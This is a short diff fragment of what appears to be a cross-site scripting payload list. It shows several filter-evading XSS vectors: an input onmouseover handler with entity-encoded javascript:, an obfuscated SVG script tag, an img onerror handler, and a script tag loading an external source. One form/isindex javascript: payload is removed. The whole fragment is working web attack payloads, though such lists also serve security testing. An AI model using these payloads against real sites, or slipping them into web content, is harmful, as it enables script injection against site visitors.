@@ -9,7 +9,6 @@
 <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
 <sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
 <img/src=`%00` onerror=this.onerror=confirm(1) 
-<form><isindex formaction="javascript&colon;confirm(1)"
 <script/&Tab; src='https://github.com' /&Tab;></script>
 
 
